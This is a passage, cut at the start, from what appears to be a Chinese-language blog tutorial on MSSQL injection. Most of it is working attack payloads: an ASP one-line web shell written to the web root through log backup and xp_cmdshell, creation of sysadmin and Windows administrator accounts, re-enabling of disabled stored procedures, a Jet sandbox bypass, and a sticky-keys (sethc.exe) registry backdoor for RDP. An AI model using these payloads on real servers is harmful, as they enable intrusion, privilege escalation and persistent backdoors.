<pre><code class="hljssql">   ?id=1;<span class="hljs-operator"><span class="hljs-keyword">backup</span> <span class="hljs-keyword">log</span> <span class="hljs-keyword">DATABASE</span> <span class="hljs-keyword">to</span> disk = <span class="hljs-string">'E:\wwwroot\www\1.asp'</span> <span class="hljs-keyword">with</span> init <span class="hljs-comment">--</span></span>
</code></pre>
<p>   4.在table0表中的列a写入一句话</p>
<pre><code class="hljssql">   <span class="hljs-operator"><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> table0 (a) <span class="hljs-keyword">values</span> (<span class="hljs-string">'&lt;%%25Execute(request("go"))%
%25&gt;'</span>)<span class="hljs-comment">--</span></span>
</code></pre>
<p>   5.备份差异log</p>
<pre><code class="hljssql">   ;<span class="hljs-operator"><span class="hljs-keyword">backup</span> <span class="hljs-keyword">log</span> <span class="hljs-keyword">DATABASE</span> <span class="hljs-keyword">to</span> disk = <span class="hljs-string">'E:\wwwroot\www\1.asp'</span> <span class="hljs-comment">--</span></span>
</code></pre>
<p>方法三：xp_cmdshell
<code>;exec xp_cmdshell 'echo &lt;%execute(request("a"))%&gt; &gt;c:\a.aspx'</code></p>
<h4 id="-">提权</h4>
<h5 id="-">数据库提权</h5>
<p>mssql数据库中sa==system&gt;administrator
1.新建数据库用户</p>
<pre><code class="hljssql">;<span class="hljs-built_in">exec</span> master..sp_addlogin <span class="hljs-built_in">test</span>,<span class="hljs-number">123456</span>;--
</code></pre>
<p>2.将用户加入sysadmin组</p>
<pre><code class="hljssql">;<span class="hljs-built_in">exec</span> master..sp_addsrvrolemember <span class="hljs-built_in">test</span>,sysadmin;--
</code></pre>
<p>3.获取sa密码
<code>sqlmap.py -u "www.abc.com?id=1" --passwords</code></p>
<h5 id="-">系统提权</h5>
<p>系统提权的一些操作是建立在sa权限的基础上的，所以要先进行数据库提权。
1.xp_cmdshell提权</p>
<pre><code class="hljssql"><span class="hljs-keyword">exec</span> xp_cmdshell <span class="hljs-string">'net user test 123456 /add &amp;&amp; net localgroup administrators test /add'</span>
</code></pre>
<p>这个payload的有个条件是xp_cmdshell需要开启
通过</p>
<pre><code class="hljssql"><span class="hljs-operator"><span class="hljs-keyword">select</span> <span class="hljs-keyword">count</span>(*)<span class="hljs-keyword">from</span> <span class="hljs-keyword">master</span>.dbo.sysobjects <span class="hljs-keyword">where</span> xtype = <span class="hljs-string">'x'</span> <span class="hljs-keyword">and</span> name = <span class="hljs-string">'xp_cmdshell'</span> ;</span>
</code></pre>
<p>判断。返回1说明开启。返回0可以通过xplog70.dll恢复。
<code>EXEC sp_configure 'show advanced options', 1 ;Reconfigure;EXEC sp_configure 'xp_cmdshell', 1 ;RECONFIGURE ;</code>
（这四条语句一起执行，然后语句中间没有空格，执行后可启用。）</p>
<pre><code class="hljssql"><span class="hljs-title">dbcc</span> addextendedproc(<span class="hljs-string">"xp_cmdshell"</span>,<span class="hljs-string">"xplog70.dll"</span>)
</code></pre>
<p>2.sp_oacreate和sp_oamethod提权</p>
<pre><code class="hljssql"><span class="hljs-title">declare</span> <span class="hljs-variable">@cmd</span> INT;

<span class="hljs-title">exec</span> sp_oacreate <span class="hljs-string">'wscript.shell'</span>,<span class="hljs-variable">@cmd</span> output;

<span class="hljs-title">exec</span> sp_oamethod <span class="hljs-variable">@cmd</span>,<span class="hljs-string">'run'</span>,null,<span class="hljs-string">'net user test 123456 /add'</span>,<span class="hljs-string">'0'</span>,<span class="hljs-string">'true'</span>;

<span class="hljs-title">exec</span> sp_oacreate <span class="hljs-string">'wscript.shell'</span>,<span class="hljs-variable">@cmd</span> output;

<span class="hljs-title">exec</span> sp_oamethod <span class="hljs-variable">@cmd</span>,<span class="hljs-string">'run'</span>,null,<span class="hljs-string">'net localgroup administrators test /add'</span>,<span class="hljs-string">'0'</span>,<span class="hljs-string">'true'</span>;
</code></pre>
<p>如果出现没有开启存储过程则需要使用下面的语句</p>
<pre><code class="hljssql"><span class="hljs-keyword">exec</span> sp_configure <span class="hljs-string">'show advanced options'</span>, <span class="hljs-number">1</span>;RECONFIGURE;<span class="hljs-keyword">exec</span> sp_configure <span class="hljs-string">'Ole Automation Procedures'</span>,<span class="hljs-number">1</span>;RECONFIGURE;
</code></pre>
<p>同样是没有空格，一起执行。</p>
<pre><code class="hljssql"><span class="hljs-title">dbcc</span> addextendedproc(<span class="hljs-string">"sp_oacreate"</span>,<span class="hljs-string">"odsole70.dll"</span>)
</code></pre>
<p>3.沙盒提权
这种提权是利用access的沙盒机制，关闭沙盒之后执行代码。
首先用xp_regwrite这个存储这个存储过程对注册表进行写操作，关闭沙盒模式：</p>
<pre><code class="hljssql"><span class="hljs-title">EXEC</span> master.dbo.xp_regwrite <span class="hljs-string">'HKEY_LOCAL_MACHINE'</span>,<span class="hljs-string">'SoftWare\Microsoft\Jet\4.0\Engines'</span>,<span class="hljs-string">'SandBoxMode'</span>,<span class="hljs-string">'REG_DWORD'</span>,<span class="hljs-number">0</span>
</code></pre>
<p>然后利用sql语句添加一个帐号和密码都为sql$的帐号，同时加入管理员组进行提权：
创建账户：</p>
<pre><code class="hljssql"><span class="hljs-operator"><span class="hljs-keyword">Select</span> * <span class="hljs-keyword">From</span> OpenRowSet(<span class="hljs-string">'Microsoft.Jet.OLEDB.4.0'</span>,<span class="hljs-string">';Database=c:\windows\system32\ias\ias.mdb'</span>,<span class="hljs-string">'select shell("net user test$ 123456 /add")'</span>);</span>
</code></pre>
<p>添加到管理员组:</p>
<pre><code class="hljssql"><span class="hljs-operator"><span class="hljs-keyword">Select</span> * <span class="hljs-keyword">From</span> OpenRowSet(<span class="hljs-string">'Microsoft.Jet.OLEDB.4.0'</span>,<span class="hljs-string">';Database=c:\windows\system32\ias\ias.mdb'</span>,<span class="hljs-string">'select shell("net localgroup administrators test$ /add")'</span>);</span>
</code></pre>
<p>因为mssql默认禁用Ad Hoc Distributed，需要开启：</p>
<pre><code class="hljssql"><span class="hljs-keyword">exec</span> sp_configure <span class="hljs-string">'show advanced options'</span>,<span class="hljs-number">1</span> ;reconfigure ;<span class="hljs-keyword">exec</span> sp_configure <span class="hljs-string">'Ad Hoc Distributed Queries'</span>,<span class="hljs-number">1</span> ;reconfigure;
</code></pre>
<ol>
<li>映像劫持提权
利用regwrite函数修改注册表，起到劫持作用：</li>
</ol>
<pre><code class="hljssql"><span class="hljs-title">EXEC</span> master..xp_regwrite <span class="hljs-variable">@rootkey</span>=<span class="hljs-string">'HKEY_LOCAL_MACHINE'</span>,<span class="hljs-variable">@key</span>=<span class="hljs-string">'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.EXE'</span>,<span class="hljs-variable">@value_name</span>=<span class="hljs-string">'Debugger'</span>,<span class="hljs-variable">@type</span>=<span class="hljs-string">'REG_SZ'</span>,<span class="hljs-variable">@value</span>=<span class="hljs-string">'c:\windows\system32\cmd.exe'</span>
</code></pre>
<p>然后检查是否劫持成功</p>
<pre><code class="hljssql"><span class="hljs-keyword">exec</span> master..xp_regread <span class="hljs-string">'HKEY_LOCAL_MACHINE'</span>,<span class="hljs-string">'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe'</span>,<span class="hljs-string">'Debugger'</span>
</code></pre>
<p>连入3389，连按5次shift，可以启动cmd，后续利用cmd提权。这也就是经典的shift后门。</p>
<h2 id="-">总结</h2>
<p>断断续续写了好久，感觉mssql注入不能一味的和MySQL注入类比，强行类比让我写的很累，磕磕绊绊的。并且，mssql注入利用的地方，只写了能利用注入做什么。但如果从一些危险的命令的角度出发，还可以挖掘更多。</p>
</div>
</body></html>